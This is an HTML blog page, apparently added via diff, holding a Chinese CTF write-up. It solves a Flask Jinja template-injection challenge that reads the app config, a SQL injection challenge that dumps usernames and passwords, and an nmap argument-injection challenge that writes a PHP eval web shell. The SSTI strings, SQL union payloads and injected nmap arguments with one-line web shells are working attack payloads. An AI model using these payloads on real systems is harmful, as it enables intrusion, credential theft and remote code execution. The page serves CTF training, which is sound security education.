@@ -1,0 +1,664 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[WesternCTF2018]shrine1import flask import os app &#x3D; flask.Flask(__name__) app.config[&amp;#x27;FLAG&amp;#x27;] &#x3D; os.environ.pop(&amp;#x27;FLAG&amp;#x27;) @app.route(&amp;#x27;&#x2F;&amp;#x27;) def index(): return open(__file__).r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB shrine模板注入nmap的基本使用">
+<meta property="og:url" content="http://example.com/2023/04/20/WEB%20shrine%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5nmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="[WesternCTF2018]shrine1import flask import os app &#x3D; flask.Flask(__name__) app.config[&amp;#x27;FLAG&amp;#x27;] &#x3D; os.environ.pop(&amp;#x27;FLAG&amp;#x27;) @app.route(&amp;#x27;&#x2F;&amp;#x27;) def index(): return open(__file__).r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9e9e4be05afd4be681c782b36a960ed8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e15985196f804adcade4d0ce277157a5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d98549e81d0e4c3f8e8f6e29c692ef95.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/92b794901bdf4b688fe06a89dfcddc2b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b4fd37dbb75b43df8e3ad4e26d320a20.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c11d8687e9ef421fa376ab060ef1ee94.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1e9e9c6a7ce748c994279394f495bcb5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/60edb8770b8b49639f784f7dab102166.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7fec2c3527f4414bba5297fa0026fa00.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/11ec9b8ff0ab4e0e809820359eaf79d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3902dc83d36a44f79f34fda45674a50e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/75db58c9f3e54891ab258f56b6ab5387.png">
+<meta property="article:published_time" content="2023-04-20T15:33:27.664Z">
+<meta property="article:modified_time" content="2021-11-14T01:28:10.000Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/9e9e4be05afd4be681c782b36a960ed8.png">
+  
+  
+  
+  <title>WEB shrine模板注入nmap的基本使用 - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WEB shrine模板注入nmap的基本使用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">WEB shrine模板注入nmap的基本使用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">import flask import os app = flask.<span class="hljs-title function_ invoke__">Flask</span>(__name__) app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.<span class="hljs-title function_ invoke__">pop</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>) @app.<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-string">&#x27;/&#x27;</span>) def <span class="hljs-title function_ invoke__">index</span>(): <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">open</span>(__file__).<span class="hljs-title function_ invoke__">read</span>() @app.<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-string">&#x27;/shrine/&#x27;</span>) def <span class="hljs-title function_ invoke__">shrine</span>(shrine): def <span class="hljs-title function_ invoke__">safe_jinja</span>(s): s = s.<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>] <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-title function_ invoke__">format</span>(c) <span class="hljs-keyword">for</span> c in blacklist]) + s <span class="hljs-keyword">return</span> flask.<span class="hljs-title function_ invoke__">render_template_string</span>(<span class="hljs-title function_ invoke__">safe_jinja</span>(shrine)) <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: app.<span class="hljs-title function_ invoke__">run</span>(debug=True) <br></code></pre></td></tr></table></figure>
+<p>打开题目源码长这样 一点都不整齐 需要我们手动去修改，整理过后</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">import flask<br>import os <br>app = flask.<span class="hljs-title function_ invoke__">Flask</span>(__name__) <br><br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.<span class="hljs-title function_ invoke__">pop</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br>@app.<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-string">&#x27;/&#x27;</span>) <br>def <span class="hljs-title function_ invoke__">index</span>(): <br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">open</span>(__file__).<span class="hljs-title function_ invoke__">read</span>() <br><br>@app.<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-string">&#x27;/shrine/&#x27;</span>) <br>def <span class="hljs-title function_ invoke__">shrine</span>(shrine): <br><br>      def <span class="hljs-title function_ invoke__">safe_jinja</span>(s):<br>            s = s.<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <br>            blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>] <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-title function_ invoke__">format</span>(c) <span class="hljs-keyword">for</span> c in blacklist]) + s <br><br>      <span class="hljs-keyword">return</span> flask.<span class="hljs-title function_ invoke__">render_template_string</span>(<span class="hljs-title function_ invoke__">safe_jinja</span>(shrine)) <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>     app.<span class="hljs-title function_ invoke__">run</span>(debug=True) <br></code></pre></td></tr></table></figure>
+<p>代码审计  代码中给出了两个路由，第一个是用来显示源代码的<br>第二个路由在shrine路径下提交参数，模板中设定 包括的内容为后端变量，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.<span class="hljs-title function_ invoke__">pop</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br>表示注册了一个名为FLAG的config，可能就是flag，如果没有过滤config，可以&#123;&#123;config&#125;&#125;即可查看所有app.config内容，<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-title function_ invoke__">format</span>(c) <span class="hljs-keyword">for</span> c in blacklist]) + s<br>上面这行代码把黑名单的东西遍历并设置为空 <br>比如这一题的config和<span class="hljs-built_in">self</span>.dict<br>但是Python还有一些内置函数，比如url_for和get_flashed_messages<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//3704e20a-9227-44d4-90c2-3ef0e1a9f3fa.node4.buuoj.cn:81/shrine/%7B%7B3+3%7D%7D</span><br></code></pre></td></tr></table></figure>
+<p>得到6<br>正常情况下 会试着先传入 config 或者传入self.<strong>dict</strong><br><img src="https://img-blog.csdnimg.cn/9e9e4be05afd4be681c782b36a960ed8.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>但是得到的是none 还有一个不回显</p>
+<p>使用 <strong>&#x2F;shrine&#x2F;{{url_for.__globals__}}</strong><br><img src="https://img-blog.csdnimg.cn/e15985196f804adcade4d0ce277157a5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>看到current_app意思是当前app，呢我们就当前app下的config<br><strong>&#x2F;shrine&#x2F;{{url_for.__globals__['current_app'].config}}</strong><br><img src="https://img-blog.csdnimg.cn/d98549e81d0e4c3f8e8f6e29c692ef95.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>第二种方法：<br><strong>get_flashed_messages</strong><br>    返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p>
+<pre><code class="hljs">**/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;**
+得到flag
+</code></pre>
+<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>首先进行注册 登陆后发现可以申请发布公告<br>在测试输入1;的时候 发现<br><img src="https://img-blog.csdnimg.cn/92b794901bdf4b688fe06a89dfcddc2b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>使用我的fuzz字典爆破<br><img src="https://img-blog.csdnimg.cn/b4fd37dbb75b43df8e3ad4e26d320a20.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>长度为321的全部都是被过滤的 发现过滤的不少 、<br>发现是报错注入<br>直接上payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#group by获取列数</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/group/**/by/**/22,&#x27;</span><span class="hljs-number">11</span><br><span class="hljs-comment">#查看版本</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="hljs-number">22</span><br><span class="hljs-comment">#获取表名</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,</span><br><span class="hljs-string">(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum</span><br><span class="hljs-string">ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</span><br><span class="hljs-string">,19,20,21,&#x27;</span><span class="hljs-number">22</span><br><span class="hljs-comment">#获取用户名</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,</span><br><span class="hljs-string">(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele</span><br><span class="hljs-string">ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="hljs-number">22</span><br><span class="hljs-comment">#获取密码</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,</span><br><span class="hljs-string">(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/sele</span><br><span class="hljs-string">ct*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><span class="hljs-number">22</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>这个题目还是很有意思的 考察了nmap的使用<br>-oN 标准保存<br>-oX XML保存<br>-oG Grep保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件<br><img src="https://img-blog.csdnimg.cn/c11d8687e9ef421fa376ab060ef1ee94.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>ping 127.0.0.1<br><img src="https://img-blog.csdnimg.cn/1e9e9c6a7ce748c994279394f495bcb5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>nmap 的-oG命令可以实现代码的写入，这里就构造payload</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG H0ne.php &#x27;</span><br></code></pre></td></tr></table></figure>
+<p>但是回显hacker 说明被黑名单了 fuzz测试 发现过滤了php<br>百度发现 &lt;? 可以用&lt;?php进行绕过<br>利用phtml来代替php的后缀<br>最终的payload是</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG H0ne.phtml &#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/60edb8770b8b49639f784f7dab102166.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发现上传上去了<br>通过蚁剑连接 就可以得到flag<br><img src="https://img-blog.csdnimg.cn/7fec2c3527f4414bba5297fa0026fa00.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>得到回显<br><img src="https://img-blog.csdnimg.cn/11ec9b8ff0ab4e0e809820359eaf79d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><strong>第二种方法：</strong><br>nmap还有-oN功能<br>nmap -oN H0ne.txt<br>构造：<br>‘ -oN H0ne.txt ‘<br><img src="https://img-blog.csdnimg.cn/3902dc83d36a44f79f34fda45674a50e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/75db58c9f3e54891ab258f56b6ab5387.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发现文件写入成功<br>然后写入php 用一句话木马 连接进去即可</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27;  -oN H0ne.phtml </span><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> &#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>WEB shrine模板注入nmap的基本使用</div>
+      <div>http://example.com/2023/04/20/WEB shrine模板注入nmap的基本使用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/Web%E5%BA%94%E7%94%A8/" title="Web应用">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Web应用</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/The%20mystery%20of%20ip/" title="The mystery of ip">
+                        <span class="hidden-mobile">The mystery of ip</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
